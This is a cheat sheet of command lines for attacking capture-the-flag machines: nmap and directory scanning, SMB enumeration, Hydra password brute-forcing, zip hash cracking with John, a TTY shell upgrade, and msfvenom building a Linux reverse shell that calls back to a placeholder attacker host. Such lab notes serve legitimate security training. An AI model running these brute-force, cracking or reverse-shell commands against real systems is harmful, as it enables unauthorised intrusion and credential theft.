
# CTF_Cookbook
A collection of tool commands and scripts for capture the flag machines

  # Nmap (Port scanning tool)
      
  Discover common ports and their versions. Output all formats to an nmap folder
      
  ```bash
  nmap -sC -sV -oA nmap/[filename] [box_ip_address]
  ```
  An aggressive detection scan 
      
  ```bash
  nmap -T4 -A -oA nmap/[filename] [box_ip_address]
  ```
  Scan all ports and write results to file in all formats
  
  ```bash
  nmap -p- -oA [FILENAME] [RHOST_IP]
  ```
  
  Scan all ports and then search through XML file results with SearchSploit to find possible exploits
  ```bash
  nmap -p- -sV -oX [FILENAME.xml] [RHOST_IP]; searchsploit --nmap [FILENAME.xml]
  ```

  # Gobuster (Directory scanning tool)
  
  Scan directories on port using list in file directory-list-2.3-medium.txt and output it to file gobuster.log
  
  ```bash
  gobuster -u http://[RHOST_IP]:[PORT] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log
  ```
  
  Scan multiple directories using a for loop
  ```bash
  for i in admin test dev backup loop; do
  gobuster -u http://[RHOST_IP]:[PORT]/$i -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-$i.log
  done
  ```
  
  # WFUZZ (a web application bruteforcer)

  Enumerate on web services
  ```bash
  wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/quickhits.txt --hc '403,404' http://[RHOST_IP]/FUZZ
  ```
  
  
  # SMBMAP (SMB enumeration tool)
  
  check for any available samba shares on the host
  
  ```bash
  smbmap -H [RHOST_IP]
  ```
  
  # LFTP (Sophisticated file transfer program)
  
  Connect to ftp server as anonymous user and run a command (In this example "ls") upon login
  
  ```bash
  lftp -u anonymous -e "ls" [RHOST_IP]
  ```
  
  # HYDRA (a very fast network logon cracker which support many different services)
  
  scan smb share with a known user against a password list
  
  ```bash
  hydra -l [USERNAME] -P [PASSWORDS.txt] smb://[RHOST_IP]
  ```
  
  # XXD (make a hexdump or do the reverse.)
  
  Reverse hex in a file
  
  ```bash
  cat [HEXFILE.txt] | xxd -r -p > [DECODED_FILE.txt]
  ```
  
  # zip2john (Crack password protected zip files.)
  
  Get hash from zip file and send to an output file for cracking
  
  ```bash
  zip2john [ZIPFILE.zip] > [OUTPUTFILE.zip.hash]
  ```
  Crack zip file hash using wordlist rockyou.txt
  
  ```bash
  john --wordlist=[/usr/share/wordlists/rockyou.txt] [OUTPUTFILE.zip.hash]
  ```
  
  # Base64 (base64 encode/decode data and print to standard output)
  
  Decode base64 contained in a file
  
  ```bash
  base64 -d [FILE_TO_DECODE.txt]
  ```
  # tr (translate or delete characters)
  
  Wipe all whitespace including newlines
  
  ```bash
  cat [FILE.txt] | tr -d " \t\n\r"
  ```

  # Upgrade the Interactive Shell to a Full TTY Shell
  
  ```bash
  python -c 'import pty; pty.spawn("/bin/bash")'
  export TERM=xterm
  Ctrl-z
  stty raw -echo
  fg
  reset
  ```
  
  # MSVENOM (Payload Generator and Encoder)
  
  Create 32-bit reverse shell for Linux 
  
  ```bash
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=[LHOST_IP] LPORT=[LHOST_PORT] -f elf -o rev
  ```
  
  # Start SimpleHTTPServer with Python
  
  ```python
  python -m SimpleHTTPServer 80
  ```
  
  
  
  
  
  
  
  
  
  
  
  
  
  
